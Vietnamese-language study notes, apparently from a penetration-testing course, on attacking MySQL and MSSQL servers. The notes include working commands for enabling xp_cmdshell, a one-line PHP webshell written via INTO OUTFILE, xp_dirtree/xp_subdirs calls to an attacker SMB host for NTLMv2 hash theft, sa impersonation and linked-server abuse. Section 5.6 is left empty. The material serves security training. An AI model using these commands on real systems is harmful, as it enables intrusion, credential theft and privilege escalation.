# Tấn công Cơ sở Dữ liệu SQL (Attacking SQL Databases) — Tóm tắt đầy đủ

## Tổng quan

**MySQL** và **Microsoft SQL Server (MSSQL)** là các hệ quản trị cơ sở dữ liệu quan hệ, lưu trữ dữ liệu trong bảng, cột và hàng, sử dụng **SQL (Structured Query Language)** để truy vấn và quản lý.

Database host là mục tiêu có giá trị cao vì lưu trữ nhiều loại dữ liệu nhạy cảm: credential, PII, dữ liệu kinh doanh, thông tin thanh toán. Ngoài ra, các dịch vụ này thường được cấu hình với **người dùng có quyền cao**, cho phép kẻ tấn công leo thang đặc quyền hoặc di chuyển ngang (lateral movement).

---

## 1. Thu thập thông tin (Enumeration)

### Cổng mặc định

| Dịch vụ | Cổng mặc định | Cổng ẩn |
|---------|---------------|---------|
| MSSQL | TCP/1433, UDP/1434 | TCP/2433 (hidden mode) |
| MySQL | TCP/3306 | — |

### Banner Grabbing bằng Nmap

```bash
nmap -Pn -sV -sC -p1433 10.10.10.125
```

Thông tin thu được: phiên bản SQL Server, tên NetBIOS, tên domain, tên DNS, phiên bản sản phẩm.

---

## 2. Cơ chế Xác thực

### MSSQL — hai chế độ

| Chế độ | Mô tả |
|--------|-------|
| **Windows Authentication** | Mặc định, tích hợp với Windows/Active Directory. Người dùng Windows đã xác thực không cần thêm credential. |
| **Mixed Mode** | Hỗ trợ cả Windows Authentication và SQL Server Authentication (username/password lưu trong SQL Server). |

### MySQL

Hỗ trợ username/password và Windows Authentication (cần plugin). Lỗ hổng đáng chú ý: **CVE-2012-2122** — MySQL 5.6.x cho phép vượt qua xác thực bằng cách thử lặp lại cùng mật khẩu sai do lỗi so sánh (comparison bug).

---

## 3. Cấu hình sai (Misconfigurations)

Xác thực cấu hình sai có thể cho phép truy cập không cần credential khi:

- Truy cập ẩn danh (anonymous access) được bật.
- Người dùng không có mật khẩu.
- Bất kỳ user/group/machine nào đều được phép truy cập SQL Server.

---

## 4. Quyền hạn (Privileges)

Tùy vào quyền người dùng, ta có thể thực hiện:

- Đọc/thay đổi nội dung database
- Đọc/thay đổi cấu hình server
- Thực thi lệnh hệ thống
- Đọc file cục bộ
- Giao tiếp với database khác
- Bắt hash hệ thống cục bộ
- Mạo danh người dùng hiện có
- Truy cập mạng khác

## 5. Tấn công theo giao thức (Protocol Specific Attacks)

### 5.1. Kết nối đến SQL Server

**MySQL (Linux):**
```bash
mysql -u julio -pPassword123 -h 10.129.20.13
```

**MSSQL — sqlcmd (Windows):**
```cmd
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

**MSSQL — sqsh (Linux):**
```bash
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

**MSSQL — Impacket mssqlclient.py (Linux):**
```bash
mssqlclient.py -p 1433 julio@10.129.203.7
```

> **Windows Authentication:** Cần chỉ định domain hoặc hostname (ví dụ: `.\\julio`). Nếu không chỉ định, hệ thống mặc định dùng SQL Authentication.

### 5.2. Database mặc định

**MySQL:**

| Database | Mục đích |
|----------|----------|
| `mysql` | Database hệ thống, lưu thông tin server |
| `information_schema` | Metadata của database |
| `performance_schema` | Giám sát hiệu năng MySQL |
| `sys` | Hỗ trợ DBA diễn giải dữ liệu Performance Schema |

**MSSQL:**

| Database | Mục đích |
|----------|----------|
| `master` | Thông tin của instance SQL Server |
| `msdb` | Dùng bởi SQL Server Agent |
| `model` | Template cho mỗi database mới |
| `resource` | Database read-only chứa system objects |
| `tempdb` | Lưu temporary objects |

### 5.3. Cú pháp SQL cơ bản

**Liệt kê database:**

```sql
-- MySQL
SHOW DATABASES;

-- MSSQL
SELECT name FROM master.dbo.sysdatabases
GO
```

Nếu `GO` không được hãy thử với `go`

**Chọn database:**

```sql
-- MySQL
USE htbusers;

-- MSSQL
USE htbusers
GO
```

**Liệt kê bảng:**

```sql
-- MySQL
SHOW TABLES;

-- MSSQL
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
GO
```

**Xem toàn bộ dữ liệu trong bảng:**

```sql
SELECT * FROM users;
```

### 5.4. Thực thi Lệnh Hệ thống (Command Execution)

#### MSSQL — xp_cmdshell

```sql
xp_cmdshell 'whoami'
GO
```

Đặc điểm:

- Mặc định bị **tắt**, cần bật nếu có đủ quyền.
- Tiến trình Windows sinh ra có cùng quyền với tài khoản dịch vụ SQL Server.
- Hoạt động đồng bộ.

**Bật xp_cmdshell:**

```sql
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
```

Các phương pháp thực thi lệnh khác: extended stored procedures, CLR Assemblies, SQL Server Agent Jobs, external scripts, `xp_regwrite`.

#### MySQL — User Defined Functions (UDF)

MySQL hỗ trợ UDF cho phép thực thi mã C/C++ như hàm SQL. Không phổ biến trong môi trường production nhưng cần nhận biết khả năng này.

### 5.5. Ghi File Cục bộ (Write Local Files)

#### MySQL

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

Biến `secure_file_priv` kiểm soát thao tác import/export:

| Giá trị | Hành vi |
|---------|---------|
| Trống | Không giới hạn (không an toàn) |
| Tên thư mục | Chỉ cho phép đọc/ghi trong thư mục đó |
| NULL | Vô hiệu hóa import/export |

#### MSSQL

Cần bật **Ole Automation Procedures** (yêu cầu quyền admin):

```sql
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
```

Sau đó dùng `sp_OACreate` và `sp_OAMethod` để tạo file.

### 5.6. Đọc File Cục bộ (Read Local Files)

#### MSSQL

```sql

```

### 5.7. Bắt Hash tài khoản dịch vụ MSSQL (Capture MSSQL Service Hash)

Dùng stored procedure `xp_dirtree` hoặc `xp_subdirs` trỏ đến SMB server của kẻ tấn công — buộc SQL Server xác thực và gửi hash NTLMv2 của tài khoản dịch vụ.

```sql
-- Cách 1
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO

-- Cách 2
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
```

Bắt hash bằng **Responder** hoặc **impacket-smbserver**:

```bash
# Responder
sudo responder -I tun0

# impacket-smbserver
sudo impacket-smbserver share ./ -smb2support
```

Sau khi bắt được hash → crack bằng hashcat hoặc relay đến host khác.

### 5.8. Mạo danh Người dùng (Impersonate Users) — MSSQL

SQL Server có quyền đặc biệt **IMPERSONATE** cho phép người dùng đang thực thi mang quyền của người dùng khác.

**Xác định user có thể mạo danh:**

```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```

**Kiểm tra quyền hiện tại:**

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

Giá trị trả về: `0` = không phải sysadmin, `1` = là sysadmin.

**Mạo danh user SA:**

```sql
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

Sau khi mạo danh thành công → có quyền sysadmin → thực thi mọi lệnh. Dùng `REVERT` để quay lại user ban đầu.

> **Lưu ý:** Nên chạy `EXECUTE AS LOGIN` trong database `master` vì tất cả user mặc định đều có quyền truy cập database này.

---

### 5.9. Giao tiếp với Database khác — Linked Servers (MSSQL)

**Linked Servers** cho phép SQL Server thực thi câu lệnh Transact-SQL trên instance SQL Server khác hoặc sản phẩm database khác (Oracle...).

**Xác định linked servers:**

```sql
SELECT srvname, isremote FROM sysservers
GO
```

| isremote | Ý nghĩa |
|----------|---------|
| 1 | Remote server |
| 0 | Linked server |

**Thực thi lệnh trên linked server:**

```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO
```

Nếu tài khoản kết nối có quyền sysadmin trên linked server → kiểm soát hoàn toàn instance đó → đọc mọi database, chạy `xp_cmdshell`.

> **Lưu ý:** Dùng dấu nháy đơn kép (`''`) để escape dấu nháy đơn trong truy vấn linked server. Dùng dấu chấm phẩy (`;`) để chạy nhiều lệnh cùng lúc.

## Tóm tắt các phương pháp tấn công SQL Database

| Phương pháp | Áp dụng | Mục đích |
|-------------|---------|----------|
| **Banner Grabbing** | MSSQL, MySQL | Thu thập phiên bản, hostname, domain |
| **Bypass Authentication** | MySQL 5.6.x (CVE-2012-2122) | Vượt qua xác thực bằng brute force bug |
| **Đọc/ghi Database** | MSSQL, MySQL | Truy xuất dữ liệu nhạy cảm |
| **xp_cmdshell** | MSSQL | Thực thi lệnh hệ thống |
| **UDF** | MySQL | Thực thi mã C/C++ qua hàm SQL |
| **Ghi file (webshell)** | MSSQL, MySQL | Tạo webshell trên web server |
| **Đọc file** | MSSQL (`OPENROWSET`), MySQL (`LOAD_FILE`) | Đọc file hệ thống |
| **Bắt hash** | MSSQL (`xp_dirtree`, `xp_subdirs`) | Steal NTLMv2 hash tài khoản dịch vụ |
| **Mạo danh** | MSSQL (`EXECUTE AS LOGIN`) | Leo thang đặc quyền lên sysadmin |
| **Linked Servers** | MSSQL | Di chuyển ngang đến database server khác |
